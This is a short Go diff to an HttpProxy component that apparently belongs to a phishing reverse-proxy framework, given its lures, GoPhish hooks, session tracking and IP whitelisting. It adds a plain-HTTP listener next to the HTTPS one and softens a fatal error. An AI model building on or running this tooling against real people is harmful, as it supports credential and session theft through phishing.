@@ -71,6 +71,7 @@ type HttpProxy struct {
 	bl                *Blacklist
 	gophish           *GoPhish
 	sniListener       net.Listener
+	httpListener      net.Listener
 	isRunning         bool
 	sessions          map[string]*Session
 	sids              map[string]int
@@ -1603,7 +1604,7 @@ func (p *HttpProxy) httpsWorker() {
 
 	p.sniListener, err = net.Listen("tcp", p.Server.Addr)
 	if err != nil {
-		log.Fatal("%s", err)
+		log.Error("https proxy listener: %s", err)
 		return
 	}
 
@@ -1860,7 +1861,25 @@ func (p *HttpProxy) injectOgHeaders(l *Lure, body []byte) []byte {
 
 func (p *HttpProxy) Start() error {
 	go p.httpsWorker()
+	go p.httpWorker()
 	return nil
+}
+
+func (p *HttpProxy) httpWorker() {
+	addr := fmt.Sprintf("%s:%d", p.cfg.GetServerBindIP(), p.cfg.GetHttpPort())
+	
+	server := &http.Server{
+		Addr:         addr,
+		Handler:      p.Proxy,
+		ReadTimeout:  httpReadTimeout,
+		WriteTimeout: httpWriteTimeout,
+	}
+
+	log.Info("http proxy (plain) started on: %s", addr)
+	log.Info("READY: http proxy on %s", addr)
+	if err := server.ListenAndServe(); err != nil {
+		log.Error("http proxy listener: %v", err)
+	}
 }
 
 func (p *HttpProxy) whitelistIP(ip_addr string, sid string, pl_name string) {
